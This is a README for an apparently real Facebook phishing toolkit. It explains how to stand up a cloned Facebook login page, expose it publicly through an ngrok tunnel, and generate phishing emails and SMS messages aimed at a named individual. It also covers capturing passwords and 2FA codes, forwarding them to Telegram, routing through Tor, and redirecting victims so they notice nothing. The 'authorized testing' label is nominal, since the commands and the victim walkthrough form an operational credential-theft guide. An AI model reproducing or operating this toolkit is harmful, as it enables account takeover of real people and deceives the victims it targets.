# Facebook Phishing Toolkit

**Author:** Jitu Jak  
**Motivated to:** Nancy  
**Purpose:** Authorized Penetration Testing & Security Awareness

## Features

- ✅ Realistic Facebook login page clone (Desktop & Mobile)
- ✅ 2FA code capture (6-digit authenticator code)
- ✅ HTTPS with self-signed SSL certificates
- ✅ Phishing email & SMS template generation
- ✅ Telegram notifications for captured credentials
- ✅ Anti-bot protection (honeypot fields)
- ✅ Full logging with IP, User-Agent, timestamps
- ✅ ngrok integration for public URL
- ✅ Tor/proxychains support

## Directory Structure

facebook-phish/ ├── setup.sh # One-click installer ├── requirements.txt # Python dependencies ├── fb_phish.py # Main entry point ├── server.crt # SSL certificate ├── server.key # SSL private key ├── run.sh # Quick start script ├── modules/ │ ├── server.py # HTTP server │ ├── templates.py # HTML templates │ ├── logger.py # Credential logger │ ├── emailer.py # Email generator │ └── utils.py # Utilities ├── templates/ │ ├── facebook_login.html │ ├── facebook_2fa.html │ └── facebook_mobile.html ├── tools/ │ ├── ngrok_setup.sh │ └── url_shortener.py ├── payloads/ ├── logs/ └── config/





## Installation

### 1. Clone the Repository

```bash
git clone https://github.com/jitujak55/facebook-phish.git
cd facebook-phish
2. Run the Setup Script
bash



chmod +x setup.sh
sudo bash setup.sh
3. Activate Virtual Environment
bash



source venv/bin/activate
4. Fix Missing Functions (utils.py)
bash



cat > modules/utils.py << 'UTILEOF'
"""
Utility functions
Author : Jitu Jak
"""

import sys
import os

def banner():
    """Display the toolkit banner"""
    print("""
  ███████╗██████╗ ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
  ██╔════╝██╔══██╗██╔══██╗██║  ██║██║██╔════╝██║  ██║
  █████╗  ██████╔╝██████╔╝███████║██║███████╗███████║
  ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██║██║╚════██║██╔══██║
  ██║     ██████╔╝██║     ██║  ██║██║███████║██║  ██║
  ╚═╝     ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝

  Facebook Phishing Toolkit v2.0
  Author : Jitu Jak
  Motivated to : Nancy
""")

def check_dependencies():
    """Check that SSL certificate files exist"""
    if not os.path.exists('server.crt') or not os.path.exists('server.key'):
        print("[!] SSL certificates not found. Run setup.sh first.")
        sys.exit(1)

def get_client_ip(handler):
    """Extract client IP address from request handler"""
    forwarded = handler.headers.get('X-Forwarded-For')
    if forwarded:
        return forwarded.split(',')[0].strip()
    return handler.client_address[0]

def get_user_agent(handler):
    """Extract User-Agent from request handler"""
    return handler.headers.get('User-Agent', 'Unknown')
UTILEOF
Usage
Start the Phishing Server (Local Only)
bash



sudo python3 fb_phish.py --port 443
Make It Public (ngrok Tunnel)
Open a second terminal and run:

bash



# First, configure ngrok with your auth token (one-time)
ngrok config add-authtoken YOUR_NGROK_AUTH_TOKEN

# Then start the tunnel
ngrok http 443
You'll get a public URL like:




https://enroll-hanky-mosaic.ngrok-free.dev
This URL works from any device on any network (mobile data, different WiFi, anywhere in the world).

Test From Any Device
Open a browser on your phone (with WiFi off, using mobile data) and visit your ngrok URL. You should see the Facebook login page.

Generate Phishing Email & SMS
bash



python3 fb_phish.py --generate-email --email nancy@target.com --domain enroll-hanky-mosaic.ngrok-free.dev
Replace:

nancy@target.com — your target's email address
enroll-hanky-mosaic.ngrok-free.dev — your ngrok URL (without https://)
This creates:

payloads/phishing_email.html — HTML email template
payloads/sms_template.txt — SMS template
Monitor Captured Credentials
Open a third terminal and run:

bash



tail -f logs/captured_credentials_compact.log
When a victim submits credentials, you'll see:




============================================================
  [!] CREDENTIALS CAPTURED!
  [!] Email:    nancy@realemail.com
  [!] Password: herpassword123
  [!] IP:       203.0.113.45
============================================================
Advanced Options
Run with Telegram Notifications
bash



sudo python3 fb_phish.py --port 443 --telegram-bot YOUR_BOT_TOKEN --chat-id YOUR_CHAT_ID
Run with Mobile-Optimized Page
bash



sudo python3 fb_phish.py --port 443 --mob
Run on a Custom Port (HTTP)
bash



python3 fb_phish.py --port 8080 --no-https
Route Through Tor
bash



sudo service tor start
proxychains4 python3 fb_phish.py --port 8080 --no-https
Disable 2FA Capture
bash



python3 fb_phish.py --port 8080 --no-https --no-2fa
What the Victim Sees
Email arrives — looks like a real Facebook "Suspicious Login Attempt" alert
Clicks the link — goes to your ngrok URL
Sees Facebook login page — exact replica
Enters email & password — captured instantly
Sees 2FA page — asks for 6-digit code
Enters 2FA code — captured too
Redirected to real Facebook — they think everything is normal
Cleanup
bash



# Stop server (Ctrl+C in each terminal)

# Deactivate virtual environment
deactivate

# Clear logs
rm -rf logs/*
touch logs/.gitkeep
Troubleshooting
ImportError: cannot import name 'get_client_ip' from 'modules.utils'
Run the fix command from Step 4 above to populate modules/utils.py with the required functions.

Port 443 requires root
Use sudo for ports below 1024, or use a higher port:

bash



python3 fb_phish.py --port 8080 --no-https
ngrok URL changes each restart
On the free plan, ngrok generates a new URL every time you restart it. Consider a paid ngrok plan for a fixed subdomain, or use a VPS with a real domain.

License
For authorized security testing and educational purposes only.

